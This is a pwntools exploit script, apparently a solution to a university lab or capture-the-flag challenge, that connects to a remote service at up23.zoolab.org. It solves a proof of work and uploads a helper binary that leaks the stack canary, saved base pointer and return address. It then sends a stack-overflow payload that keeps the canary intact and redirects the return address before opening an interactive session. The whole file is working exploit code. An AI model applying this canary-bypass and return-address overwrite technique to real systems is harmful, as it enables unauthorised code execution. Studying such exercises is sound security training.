#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1]

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

# r = process("./remoteguess", shell=True)
# r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
else:
    r.sendlineafter(b'send to me? ', b'0')

print(r.recvuntil(b'canary = ').decode("utf-8"), end = '')
canary = r.recvline(keepends=False)
print(canary.decode('utf-8'))

print(r.recvuntil(b'rbp = ').decode("utf-8"), end = '')
rbp = r.recvline(keepends=False)
print(rbp.decode('utf-8'))

print(r.recvuntil(b'ra = ').decode("utf-8"), end = '')
ra = r.recvline(keepends=False)
print(ra.decode('utf-8'))

ans = b'0'*24
ans += p64(int(canary, 16))
ans += p64(int(rbp, 16))
ans += p64(int(ra, 16)+0xab)
ans += p64(0x0000000000000000)*10

print(r.recvuntil(b'your answer? ').decode("utf-8"), end = '')
print(ans)
r.send(ans)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
